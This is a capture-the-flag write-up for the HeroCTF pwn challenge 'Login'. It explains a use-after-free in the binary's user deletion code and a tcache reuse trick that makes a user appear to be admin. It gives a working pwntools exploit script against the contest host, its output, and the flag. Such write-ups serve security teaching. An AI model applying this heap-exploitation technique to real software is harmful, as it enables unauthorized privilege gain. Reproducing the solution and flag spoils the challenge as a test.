# Login

### Category

Pwn

### Description

Login and get the flag!

**Host** : pwn.heroctf.fr<br>
**Port** : 8002

Format : **Hero{flag}**<br>
Author : **SoEasY**

### Files

 - [Login](Login)

### Write up

Launching the challenge, we can see a menu with different choices:
```
$ ./Login
################
#     Menu     #
################

1) Create user
2) Delete user
3) Admin login
4) EXIT

--> Your choice: 
```
Alright, let's load the challenge in IDA to see what's going on.
After some reversing we cann see that the challenge is manipulating some user structure that we can recreate in IDA:
```c
typedef struct {
	char* name;
	char* type;
} user_t;
```
We can see two global varibles: `int nb_users` (number of already registred users), and `user_t users[8]` (list of users).
Let's take a look at the `create_user()` function (to simplify the code I've set the good variable types with our freshly created structure):
```c
void __fastcall add_user()
{
  char *user_name; // [rsp+8h] [rbp-18h]
  char *user_type; // [rsp+10h] [rbp-10h]
  user_t *user; // [rsp+18h] [rbp-8h]

  if ( nb_users == 8 ){
    puts("[-] Maximum users number reached!");
  
  }else{
    user_name = (char *)malloc(0x32uLL);
    user_type = (char *)malloc(0x32uLL);

    printf("\n[+] Username: ");
    fflush(stdout);
    fgets(user_name, 45, stdin);
    user_name[strcspn(user_name, "\n")] = 0;


    strcpy(user_type, "user");
    user = &users[nb_users];
    user->user_name = user_name;
    user->user_type = user_type;

    printf("[+] Created with user ID n°%d\n", (unsigned int)nb_users);
    ++nb_users;
  }
}
```

There are differents steps in a user creation:
- the user's name is set in a buffer allocated with a malloc(0x32), asked to the user
- the user's tpe is set in a buffer allocated with a malloc(0x32), set by default to "user"
- the user's name and user's type are copied to the users list
- the number of created users is printed as the user's ID and is then incremented

Let's take a look at the `remove_user()` function:
```c
unsigned __int64 remove_user()
{
  int user_id; // [rsp+Ch] [rbp-14h] BYREF
  user_t *user; // [rsp+10h] [rbp-10h]
  unsigned __int64 canary; // [rsp+18h] [rbp-8h]

  canary = __readfsqword(0x28u);

  printf("\n[+] User ID to delete: ");
  fflush(stdout);
  __isoc99_scanf("%d", &user_id);
  getchar();

  if ( user_id >= 0 && user_id < nb_users ){
    user = &users[user_id];
    free(user->user_name);
    free(user->user_type);
    printf("[+] User with ID n°%d was deleted!\n", (unsigned int)user_id);
  
  }else{
    puts("[-] Invalid user ID.");
  }
  return canary - __readfsqword(0x28u);
}
```
This will free the user's name and user's type but will not set the pointer to zero :o --> we can here have a `Use After Free`. Let's then take a look at the  `admin_login()` function:
```c
unsigned __int64 admin_login(){
  char c; // [rsp+3h] [rbp-1Dh]
  int user_id; // [rsp+4h] [rbp-1Ch] BYREF
  user_t *user; // [rsp+8h] [rbp-18h]
  FILE *stream; // [rsp+10h] [rbp-10h]
  unsigned __int64 canary; // [rsp+18h] [rbp-8h]

  canary = __readfsqword(0x28u);

  printf("\n[+] User ID to login with: ");
  fflush(stdout);
  __isoc99_scanf("%d", &user_id);
  getchar();

  if ( user_id >= 0 && user_id < nb_users ){
    user = &users[user_id];
    
    if ( !strcmp("admin", user->user_type) ){
      puts("[+] Welcome back, admin!");
      stream = fopen("flag.txt", "r");
    
      while ( 1 ){
        c = fgetc(stream);
        if ( c == -1 )
          break;
        putchar(c);
      }
    }else{
      puts("[-] You are not admin.");
    }
  }else{
    puts("[-] Invalid user ID.");
  }
  return canary - __readfsqword(0x28u);
}
```
This function will give you the flag if the user selected for login has "admin" in the user_type field.

To accomplish this, we can abuse of the UAF identified earlier. This is the plan:
- crafting a user_A with a random name
- freeing user_A
    - free the name (size of 0x32)
        - goes in tcache bin
    - free the type (size of 0x32)
        - goes in tcache bin
    - don't set to NULL pointers in users
    - don't decrement nb_users
- crafting an user_B
    - name = malloc(0x32)
        - will be the same pointer as user_A->type because of LIFO in tcache bin
        - set it to "admin"
    - type = malloc(0x32)
        - will be the same pointer as user_A->name because of LIFO in tcache bin
- user_A->type == user_B->name == "admin"
- login with ID n°0 (user_A) and GET THE FLAG !!!

```py
from pwn import *

r = remote("pwn.heroctf.fr", 8002)
# r = process("./Login")

r.sendlineafter(b"choice: ", b"1")
r.sendlineafter(b"[+] Username: ", b"yolo")

r.sendlineafter(b"choice: ", b"2")
r.sendlineafter(b"[+] User ID to delete: ", b"0")

r.sendlineafter(b"choice: ", b"1")
r.sendlineafter(b"[+] Username: ", b"admin")

r.sendlineafter(b"choice: ", b"3")
r.sendlineafter(b"[+] User ID to login with: ", b"0")

flag = r.recvall(timeout=1).decode().split('\n')[1]
print(f"[+] Flag: {flag}")
```
Result:
```sh
$ python3 solve.py 
[+] Opening connection to pwn.heroctf.fr on port 8002: Done
[+] Receiving all data: Done (190B)
[*] Closed connection to pwn.heroctf.fr port 8002
[+] Flag: Hero{Y0u_w3r3_n0t_supp0s3d_t0_3nt3r!!!}
```

### Flag

```
Hero{Y0u_w3r3_n0t_supp0s3d_t0_3nt3r!!!}
```
